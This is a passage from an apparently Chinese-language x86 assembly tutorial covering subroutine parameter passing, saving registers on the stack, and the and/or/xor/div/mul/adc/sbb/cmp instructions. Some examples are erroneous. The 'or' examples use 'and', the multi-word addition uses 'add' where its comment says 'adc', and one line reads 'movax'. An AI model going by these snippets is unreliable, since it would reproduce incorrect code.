class="token punctuation">,</span> ds:datadata segmentdb 'conversation'data endscode segmentmain: mov ax<span class="token punctuation">,</span> datamov ds<span class="token punctuation">,</span> axmov si<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token comment">; ds:si 指向 'conversation' 第一个字节</span>mov cx<span class="token punctuation">,</span> <span class="token number">12</span>   <span class="token comment">; 字符串的长度</span>call sub1mov ax<span class="token punctuation">,</span> 4c00hint 21h<span class="token comment">; 子程序：将全是字母的字符串转换为大写</span>sub1:and byte ptr <span class="token punctuation">[</span>si<span class="token punctuation">]</span><span class="token punctuation">,</span> 11011111b   <span class="token comment">; 将字母转换为大写</span>inc siloop sub1retcode endsend main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>除此之外，<mark>也可以用栈来传递参数</mark></p></blockquote><ul><li>示例：假设 a &#x3D; 3，b &#x3D; 1，计算 $(a - b) ^ 3$</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ss:stackstack segmentdb <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>db <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>stack endscode segmentmain: mov ax<span class="token punctuation">,</span> stackmov ss<span class="token punctuation">,</span> axmov sp<span class="token punctuation">,</span> <span class="token number">16</span>   <span class="token comment">; ss:sp 指向栈底</span>mov ax<span class="token punctuation">,</span> <span class="token number">1</span>push axmov ax<span class="token punctuation">,</span> <span class="token number">3</span>push axcall sub1mov ax<span class="token punctuation">,</span> 4c00hint 21h<span class="token comment">; 子程序：实现 (a - b) 的三次方</span>sub1:push bpmov bp<span class="token punctuation">,</span> spmov ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bp <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span>   <span class="token comment">; 将栈中 a 的值送入 ax</span>sub ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>bp <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span>   <span class="token comment">; ax 减去栈中 b 的值</span>mov bp<span class="token punctuation">,</span> axmul bpmul bppop bpret <span class="token number">4</span>code endsend main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析程序执行时栈中的情况：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E5%AD%90%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8F%82%E6%95%B0%E5%92%8C%E7%BB%93%E6%9E%9C%E4%BC%A0%E9%80%921.png" alt="x86汇编_子程序的参数和结果传递1.png"></p><hr><h3 id="子程序和主程序寄存器冲突问题"><a href="#子程序和主程序寄存器冲突问题" class="headerlink" title="子程序和主程序寄存器冲突问题"></a>子程序和主程序寄存器冲突问题</h3><blockquote><p>在子程序中使用的寄存器，很可能在主程序中也会使用，如果按照以前的方法来编写代码，就可能造成子程序和主程序发生寄存器冲突</p></blockquote><ul><li>首先以一个<strong>错误的例子</strong>来说明</li></ul><p>例如：在前面“将一个全是字母的字符串转化为大写”这个例子的基础上，变为“将一个全是字母，并且以 0 结尾的字符串转化为大写”</p><p>区别在于：<em>这样可以通过 0 来判断是否已经处理完整个字符串，而不需要提前知道字符串的具体长度</em></p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ds:datadata segmentdb <span class="token char">'ctfa'</span><span class="token punctuation">,</span> <span class="token number">0</span>db <span class="token char">'ctfb'</span><span class="token punctuation">,</span> <span class="token number">0</span>db <span class="token char">'ctfc'</span><span class="token punctuation">,</span> <span class="token number">0</span>db <span class="token char">'ctfd'</span><span class="token punctuation">,</span> <span class="token number">0</span>data endscode segmentmain: mov ax<span class="token punctuation">,</span> datamov ds<span class="token punctuation">,</span> axmov bx<span class="token punctuation">,</span> <span class="token number">0</span>mov cx<span class="token punctuation">,</span> <span class="token number">4</span>   <span class="token comment">; 循环处理四组字符串</span>s:mov si<span class="token punctuation">,</span> bxcall sub1add bx<span class="token punctuation">,</span> <span class="token number">5</span>   <span class="token comment">; 每处理完一组字符串，bx 后移 5，指向下一组字符串的首字母</span>loop smov ax<span class="token punctuation">,</span> 4c00hint 21h<span class="token comment">; 子程序：将字符串转换为大写，以 0 结束</span>sub1:mov cl<span class="token punctuation">,</span> <span class="token punctuation">[</span>si<span class="token punctuation">]</span>   <span class="token comment">; CX 的低位用来记录每组字符串的 byte 型数据</span>mov ch<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token comment">; CX 的高位补 0，即：将每组字符串的 byte 型数据凑足 word 存入 CX</span>jcxz ok   <span class="token comment">; 如果 CX 为 0 则说明一组字符串已经处理完，结束本次子程序</span>and byte ptr <span class="token punctuation">[</span>si<span class="token punctuation">]</span><span class="token punctuation">,</span> 11011111b   <span class="token comment">; 将字母转换为大写</span>inc sijmp short sub1ok:retcode endsend main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>在这个程序中，主程序使用 CX 作为 loop 循环次数的计数器，子程序使用 CX 存放字符串的数据，并通过 jcxz 判断 CX 是否为 0 作为结束条件，导致主程序与子程序 CX 寄存器发生冲突</em></p><blockquote><p>如果在编写主程序时就得考虑到所有的子程序中使用了哪些寄存器，显然不现实</p><p>因此，<mark>可以在子程序的开头将子程序中用到的所有寄存器内容提前保存到栈中，等子程序结束时再从栈中恢复</mark></p></blockquote><ul><li>基于栈保存子程序寄存器的思想，改正上面的示例：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">assume cs:code<span class="token punctuation">,</span> ds:datadata segmentdb <span class="token char">'ctfa'</span><span class="token punctuation">,</span> <span class="token number">0</span>db <span class="token char">'ctfb'</span><span class="token punctuation">,</span> <span class="token number">0</span>db <span class="token char">'ctfc'</span><span class="token punctuation">,</span> <span class="token number">0</span>db <span class="token char">'ctfd'</span><span class="token punctuation">,</span> <span class="token number">0</span>data endscode segmentmain: mov ax<span class="token punctuation">,</span> datamov ds<span class="token punctuation">,</span> axmov bx<span class="token punctuation">,</span> <span class="token number">0</span>mov cx<span class="token punctuation">,</span> <span class="token number">4</span>   <span class="token comment">; 循环处理四组字符串</span>s:mov si<span class="token punctuation">,</span> bxcall sub1add bx<span class="token punctuation">,</span> <span class="token number">5</span>   <span class="token comment">; 每处理完一组字符串，bx 后移 5，指向下一组字符串的首字母</span>loop smov ax<span class="token punctuation">,</span> 4c00hint 21h<span class="token comment">; 子程序：将字符串转换为大写，以 0 结束</span>sub1:push cx   <span class="token comment">; 提前将子程序中用到的寄存器保存在栈上</span>push sisub1_start:mov cl<span class="token punctuation">,</span> <span class="token punctuation">[</span>si<span class="token punctuation">]</span>   <span class="token comment">; CX 的低位用来记录每组字符串的 byte 型数据</span>mov ch<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token comment">; CX 的高位补 0，即：将每组字符串的 byte 型数据凑足 word 存入 CX</span>jcxz ok   <span class="token comment">; 如果 CX 为 0 则说明一组字符串已经处理完，结束本次子程序</span>and byte ptr <span class="token punctuation">[</span>si<span class="token punctuation">]</span><span class="token punctuation">,</span> 11011111b   <span class="token comment">; 将字母转换为大写</span>inc sijmp short sub1_startok:pop si   <span class="token comment">; 注意入栈和出栈的顺序</span>pop cxretcode endsend main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="运算指令"><a href="#运算指令" class="headerlink" title="运算指令"></a>运算指令</h1><h2 id="and-和-or"><a href="#and-和-or" class="headerlink" title="and 和 or"></a>and 和 or</h2><blockquote><p><strong>逻辑与、逻辑或指令</strong>，按位进行计算</p><p>用法：<br><code>and ax, bx</code><br><code>or ax, bx</code></p></blockquote><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> 01100011band al<span class="token punctuation">,</span> 00111011b<span class="token comment">; 执行后 al = 00100011b</span>mov al<span class="token punctuation">,</span> 01100011bor al<span class="token punctuation">,</span> 00111011b<span class="token comment">; 执行后 al = 01111011b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><mark>and 指令可以将操作对象的对应位设为 0，其他位不变</mark></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">and al<span class="token punctuation">,</span> 11111110b   <span class="token comment">; 将 al 的第 0 位设为 0</span>and al<span class="token punctuation">,</span> 10111111b   <span class="token comment">; 将 al 的第 6 位设为 0</span>and al<span class="token punctuation">,</span> 01111111b   <span class="token comment">; 将 al 的第 7 位设为 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><mark>or 指令可以将操作对象的对应位设为 1，其他位不变</mark></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">and al<span class="token punctuation">,</span> 00000001b   <span class="token comment">; 将 al 的第 0 位设为 1</span>and al<span class="token punctuation">,</span> 01000000b   <span class="token comment">; 将 al 的第 6 位设为 1</span>and al<span class="token punctuation">,</span> 10000000b   <span class="token comment">; 将 al 的第 7 位设为 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><blockquote><p><strong>异或指令</strong>。在两个操作数的对应位之间进行按位逻辑异或操作，并将结果存放在目标操作数中。<em>如果两个位的值相同（同为 0 或同为 1），则结果位等于 0；否则结果位等于 1</em></p><p>用法：<br><code>xor 寄存器 寄存器</code><br><code>xor 寄存器 立即数</code></p></blockquote><ul><li><p>例如：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> 01100011bxor al<span class="token punctuation">,</span> 00111011b<span class="token comment">; 执行后 al = 01011000b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>xor 指令还常用于寄存器的清零操作：</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">xor ax<span class="token punctuation">,</span> ax<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以上代码将 AX 寄存器清零，等价于：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><em>问：为什么不用 <code>mov ax, 0</code> 来清零，要使用 <code>xor ax, ax</code> 呢？</em><br>因为他们虽然作用相同，但是 xor 指令比 mov 指令的机器码要短，实现效率更高</p></blockquote><hr><h2 id="div"><a href="#div" class="headerlink" title="div"></a>div</h2><blockquote><p><strong>除法指令</strong>。需注意除数的长度，有 8 位和 16 位两种</p><p>用法：<br><code>div 寄存器</code><br><code>div 内存单元</code></p></blockquote><ul><li>使用 div 指令做除法时，注意：<ol><li><strong>除数</strong>：有 8 位和 16 位两种<br> <em>存放在一个寄存器或内存单元中</em></li><li><strong>被除数</strong>：默认在 AX（被除数 16 位）或 AX 和 DX（被除数 32 位）中<br> <em>如果除数为 8 位，则被除数为 16 位，在 AX 中</em><br> <em>如果除数为 16 位，则被除数为 32 位，在 DX 和 AX 中，DX 存放高 16 位，AX 存放低 16 位</em></li><li><strong>结果</strong>：默认在 AL 和 AH（除数 8 位）或 AX 和 DX（除数 16 位）中<br> <em>如果除数为 8 位，则 AL 存放商，AH 存放余数</em><br> <em>如果除数为 16 位，则 AX 存放商，DX 存放余数</em></li></ol></li></ul><table><thead><tr><th align="left">被除数</th><th align="left">被除数位置</th><th align="left">除数</th><th align="left">除数位置</th><th align="left">商位置</th><th align="left">余数位置</th></tr></thead><tbody><tr><td align="left">16 位</td><td align="left">AX</td><td align="left">8 位</td><td align="left">8 位寄存器或内存字节单元</td><td align="left">AL</td><td align="left">AH</td></tr><tr><td align="left">32 位</td><td align="left">DX（高 16 位）<div>AX（低 16 位）</div></td><td align="left">16 位</td><td align="left">16 位寄存器或内存字节单元</td><td align="left">AX</td><td align="left">DX</td></tr></tbody></table><table><thead><tr><th align="left">指令</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>div byte ptr ds:[0]</code></td><td align="left"><code>(al) = (ax) / ((ds) * 16 + 0)</code> 的商<div><code>(ah) = (ax) / ((ds) * 16 + 0)</code> 的余数</div></td></tr><tr><td align="left"><code>div word ptr es:[0]</code></td><td align="left"><code>(ax) = [(dx) * 10000h + (ax)] / ((es) * 16 + 0)</code> 的商<div><code>(dx) = [(dx) * 10000h + (ax)] / ((es) * 16 + 0)</code> 的余数</div></td></tr><tr><td align="left"><code>div byte ptr [bx + si + 8]</code></td><td align="left"><code>(al) = (ax) / ((ds) * 16 + (bx) + (si) + 8)</code> 的商<div><code>(ah) = (ax) / ((ds) * 16 + (bx) + (si) + 8)</code> 的余数</div></td></tr><tr><td align="left"><code>div word ptr [bx + si + 8]</code></td><td align="left"><code>(ax) = [(dx) * 10000h + (ax)] / ((ds) * 16 + (bx) + (si) + 8)</code> 的商<div><code>(dx) = [(dx) * 10000h + (ax)] / ((ds) * 16 + (bx) + (si) + 8)</code> 的余数</div></td></tr></tbody></table><ul><li>例如：计算 1001 &#x2F; 100<ol><li>被除数 1001 &lt; 65535，未超过 16 位，可以单独存放在 AX 中</li><li>除数 100 &lt; 255，没有超过 8 位，但是由于被除数是 16 位，因此除数应该为 8 位</li><li>计算完成后，AL 用来存放商，AH 用来存放余数</li></ol></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token number">1001</span>   <span class="token comment">; 存放被除数 1001</span>mov bl<span class="token punctuation">,</span> <span class="token number">100</span>   <span class="token comment">; 存放除数 100</span>div bl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E8%BF%90%E7%AE%97%E6%8C%87%E4%BB%A4-div2.png" alt="x86汇编_运算指令-div2.png"></p><ul><li>例如：计算 100001 &#x2F; 100<ol><li>被除数 100001 &gt; 65535，超过了 16 位，因此不能单独用 AX 存放，需要同时使用 DX 和 AX 来存放 100001，也就是说被除数为 32 位，需要进行 16 位的除法</li><li>除数 100 &lt; 255，没有超过 8 位，但是由于被除数是 32 位，因此除数应该为 16 位，不能用 8 位寄存器存放 100，而要使用 16 位寄存器存放</li><li>计算完成后，AX 用来存放商，DX 用来存放余数</li></ol></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov dx<span class="token punctuation">,</span> <span class="token number">1</span>   <span class="token comment">; 存放被除数 100001 的高十六位，即：0000 0000 0000 0001b = 1h</span>mov ax<span class="token punctuation">,</span> 86A1h   <span class="token comment">; 存放被除数 100001 的低十六位，即：1000 0110 1010 0001b = 86A1h</span><span class="token comment">; (dx) * 10000h + (ax) = 100001</span>mov bx<span class="token punctuation">,</span> <span class="token number">100</span>   <span class="token comment">; 存放除数 100</span>div bx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E8%BF%90%E7%AE%97%E6%8C%87%E4%BB%A4-div1.png" alt="x86汇编_运算指令-div1.png"></p><hr><h2 id="mul"><a href="#mul" class="headerlink" title="mul"></a>mul</h2><blockquote><p><strong>乘法指令</strong>。需注意两个乘数的长度，有 8 位和 16 位两种</p></blockquote><blockquote><p>用法：<br><code>mul 寄存器</code><br><code>mul 内存单元</code></p></blockquote><ul><li>使用 mul 指令做乘法时，注意：<ol><li><strong>乘数</strong>：有 8 位和 16 位两种，<em>要么都是 8 位，要么都是 16 位</em><br> <em>如果是 8 位，一个默认在 AL 中，另一个在 8 位寄存器或字节单元中</em><br> <em>如果是 16 位，一个默认在 AX 中，另一个在 16 位寄存器或字节单元中</em></li><li><strong>结果</strong>：<br> <em>如果 8 位乘法，则存放在 AX</em><br> <em>如果 16 位乘法，则高 16 位存放在 DX，低 16 位存放在 AX</em></li></ol></li></ul><table><thead><tr><th align="left">乘数1</th><th align="left">乘数1 位置</th><th align="left">乘数2</th><th align="left">乘数2 位置</th><th align="left">结果位置</th></tr></thead><tbody><tr><td align="left">8 位</td><td align="left">AL</td><td align="left">8 位</td><td align="left">8 位寄存器或内存字节单元</td><td align="left">AX</td></tr><tr><td align="left">16 位</td><td align="left">AX</td><td align="left">16 位</td><td align="left">16 位寄存器或内存字节单元</td><td align="left">DX（高 16 位）<div>AX（低 16 位）</div></td></tr></tbody></table><table><thead><tr><th align="left">指令</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>mul byte ptr ds:[0]</code></td><td align="left"><code>(ax) = (al) * ((ds) * 16 + 0)</code></td></tr><tr><td align="left"><code>mul word ptr [bx + si + 8]</code></td><td align="left"><code>(ax) = (ax) * ((ds) * 16 + (bx) + (si) + 8)</code> 的低 16 位<div><code>(dx) = (ax) * ((ds) * 16 + (bx) + (si) + 8)</code> 的高 16 位</div></td></tr></tbody></table><ul><li>例如：计算 100 * 10<ol><li>乘数 100 和 10 都小于 255，可以做 8 位乘法，因此一个在寄存器 AL 中，另一个假设在 8 位寄存器 BL 中</li></ol></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> <span class="token number">100</span>   <span class="token comment">; 存放乘数 100</span>mov bl<span class="token punctuation">,</span> <span class="token number">10</span>   <span class="token comment">; 存放乘数 10</span>mul bl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E8%BF%90%E7%AE%97%E6%8C%87%E4%BB%A4-mul1.png" alt="x86汇编_运算指令-mul1.png"></p><ul><li>例如：计算 100 * 10000<ol><li>乘数 100 &lt; 255，但 10000 &gt; 255，所以必须做 16 位乘法，因此一个在寄存器 AX 中，另一个假设在 16 位寄存器 BX 中</li></ol></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token number">100</span>   <span class="token comment">; 存放乘数 100</span>mov bx<span class="token punctuation">,</span> <span class="token number">10000</span>   <span class="token comment">; 存放乘数 10000</span>mul bx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E8%BF%90%E7%AE%97%E6%8C%87%E4%BB%A4-mul2.png" alt="x86汇编_运算指令-mul2.png"></p><hr><h2 id="adc"><a href="#adc" class="headerlink" title="adc"></a>adc</h2><blockquote><p><strong>带进位加法指令</strong>。利用了 FLAG 寄存器中 CF 位上记录的进位值</p><p>用法：<br><code>adc ax, bx</code></p></blockquote><ul><li>指令 <code>adc ax, bx</code> 相当于执行：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token punctuation">(</span>ax<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ax<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>bx<span class="token punctuation">)</span> <span class="token operator">+</span> CF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>例如：</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token number">2</span>mov bx<span class="token punctuation">,</span> <span class="token number">1</span>sub bx<span class="token punctuation">,</span> ax   <span class="token comment">; 最高位借 1，所以 CF = 1</span>adc ax<span class="token punctuation">,</span> <span class="token number">1</span>   <span class="token comment">; ax = 2 + 1 + 1 = 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>例如：</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token number">1</span>add ax<span class="token punctuation">,</span> ax   <span class="token comment">; 最高位无借位和进位，CF = 0</span>adc ax<span class="token punctuation">,</span> <span class="token number">3</span>   <span class="token comment">; ax = 2 + 3 + 0 = 5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>例如：</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov al<span class="token punctuation">,</span> 98hadd al<span class="token punctuation">,</span> al   <span class="token comment">; 最高位进 1，所以 CF = 1，al 丢掉进位后为 00110000b = 30h</span>adc al<span class="token punctuation">,</span> <span class="token number">3</span>   <span class="token comment">; al = 30h + 3 + 1 = 34h</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>可以看出 adc 指令与 add 指令的区别就在于 adc 会加上 CF 中的值</p><p>但是 CPU 提供这条指令有什么作用呢？</p></blockquote><ul><li>例如：计算 0198h + 0183h</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">   <span class="token number">01</span> <span class="token number">98</span><span class="token operator">+</span>  <span class="token number">01</span> <span class="token number">83</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>   <span class="token number">03</span> 1B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>可见加法是可以分为两步进行的：</strong><br>① <strong>低位相加</strong><br>② <strong>高位相加再加上低位产生的进位值</strong></p><p>也就是说 <code>add ax, bx</code> 等价于：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">add al<span class="token punctuation">,</span> bladc ah<span class="token punctuation">,</span> bh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>由于寄存器的长度限制，例如计算：1EF000h + 201000h 时，两个操作数以及结果都超过了 16 位，add 指令是无法实现求和的</p><p>此时，就可以利用 adc 指令配合 add 指令，将一个加法分为两步，即可解决这个问题</p></blockquote><ul><li>例如：计算 1EF000h + 201000h，并将结果的高位放在 AX 中，低位放在 BX 中</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 001Eh   <span class="token comment">; 存放第一个操作数的高位</span>mov bx<span class="token punctuation">,</span> 0F000h   <span class="token comment">; 存放第一个操作数的低位</span>add bx<span class="token punctuation">,</span> 1000h   <span class="token comment">; 使用 add 指令将两个操作数的低位相加</span>adc ax<span class="token punctuation">,</span> 0020h   <span class="token comment">; 使用 adc 指令将两个操作数的高位相加</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>另外，由于 adc 指令也可能产生进位值，也会对 CF 位进行设置</p><p>这样一来，就可以对任意大的数据进行加法运算</p></blockquote><ul><li>例如：计算 1EF0001000h + 2010001EF0h，并将结果的最高 16 位放在 AX 中，次高 16 位放在 BX 中，低 16 位放在 CX 中</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 001Eh   <span class="token comment">; 存放第一个操作数的最高 16 位</span>mov bx<span class="token punctuation">,</span> 0F000h   <span class="token comment">; 存放第一个操作数的次高 16 位</span>mov cx<span class="token punctuation">,</span> 1000h   <span class="token comment">; 存放第一个操作数的低 16 位</span>add cx<span class="token punctuation">,</span> 1EF0h   <span class="token comment">; 使用 add 指令将两个操作数的低 16 位相加</span>add bx<span class="token punctuation">,</span> 1000h   <span class="token comment">; 使用 adc 指令将两个操作数的次高 16 位相加</span>adc ax<span class="token punctuation">,</span> 0020h   <span class="token comment">; 使用 adc 指令将两个操作数的最高 16 位相加</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>例如：编程实现一个子程序，用来对两个 128 位的数据进行相加</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">add128:push axpush cxpush sipush disub ax<span class="token punctuation">,</span> ax   <span class="token comment">; 将 CF 设置为 0</span>mov cx<span class="token punctuation">,</span> <span class="token number">8</span>   <span class="token comment">; 循环 8 次，每次处理 16 位</span>s:movax<span class="token punctuation">,</span> <span class="token punctuation">[</span>si<span class="token punctuation">]</span>   <span class="token comment">; ds:si 指向第一个数的内存单元</span>adc ax<span class="token punctuation">,</span> <span class="token punctuation">[</span>di<span class="token punctuation">]</span>   <span class="token comment">; ds:di 指向第二个数的内存单元</span>mov <span class="token punctuation">[</span>si<span class="token punctuation">]</span><span class="token punctuation">,</span> ax   <span class="token comment">; 将结果存放在第一个数的内存单元中</span>inc siinc siinc diinc diloop spop dipop sipop cxpop axret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：上面的例子中，<strong>inc 指令和 loop 指令不影响 CF 位</strong></p><p>如果将两个 <code>inc si</code> 和两个 <code>inc di</code> 写成 <code>add si, 2</code> 和 <code>add di, 2</code> 可能会造成 add 指令改变 CF 位导致计算错误</p></blockquote><hr><h2 id="sbb"><a href="#sbb" class="headerlink" title="sbb"></a>sbb</h2><blockquote><p><strong>带借位减法指令</strong>。利用了 FLAG 寄存器中 CF 位上记录的借位值</p><p>用法：<br><code>sbb ax, bx</code></p></blockquote><ul><li>指令 <code>sbb ax, bx</code> 相当于执行：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token punctuation">(</span>ax<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>ax<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>bx<span class="token punctuation">)</span> <span class="token operator">-</span> CF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p><strong>与 adc 指令类似，sbb 指令也可以对任意大的数据进行减法运算</strong></p></li><li><p>例如：计算 003E1000h - 00202000h，结果的高位放在 AX 中，低位放在 BX 中</p></li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> 003Eh   <span class="token comment">; 存放第一个操作数的高位</span>mov bx<span class="token punctuation">,</span> 1000h   <span class="token comment">; 存放第一个操作数的低位</span>sub bx<span class="token punctuation">,</span> 2000h   <span class="token comment">; 使用 sub 指令将两个操作数的低位相减</span>sbb ax<span class="token punctuation">,</span> 0020h   <span class="token comment">; 使用 sbb 指令将两个操作数的高位相减</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h2><blockquote><p><strong>比较指令</strong>。功能相当于减法指令，但是不保存结果，会对标志寄存器产生影响，其他相关指令可以通过识别这些标志寄存器位来进行相关操作</p><p>用法：<br><code>cmp ax, bx</code></p></blockquote><ul><li>指令 <code>cmp ax, bx</code> 相当于执行：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm"><span class="token punctuation">(</span>ax<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>bx<span class="token punctuation">)</span> 但结果不在 ax 中保存<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>例如：</li></ul><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov ax<span class="token punctuation">,</span> <span class="token number">52</span>cmp ax<span class="token punctuation">,</span> ax<span class="token comment">; 执行后，ax = 52，zf = 1，pf = 1，sf = 0，cf = 0，of = 0</span>mov ax<span class="token punctuation">,</span> <span class="token number">8</span>mov bx<span class="token punctuation">,</span> <span class="token number">3</span>cmp ax<span class="token punctuation">,</span> bx<span class="token comment">; 执行后，ax = 8，zf = 0，pf = 1，sf = 0，cf = 0，of 